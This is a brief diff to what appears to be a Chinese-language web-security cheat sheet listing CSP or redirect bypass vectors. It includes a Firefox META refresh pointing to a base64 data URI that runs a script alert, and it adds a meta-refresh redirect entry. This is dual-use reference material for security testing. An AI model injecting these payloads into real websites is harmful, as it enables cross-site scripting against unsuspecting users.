@@ -153,4 +153,4 @@ MIME Sniff
 - a标签的ping属性
 - For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
 - ``<link rel="import" />``
-- 利用object
+- ``<meta http-equiv="refresh" content="0; url=http://...." />
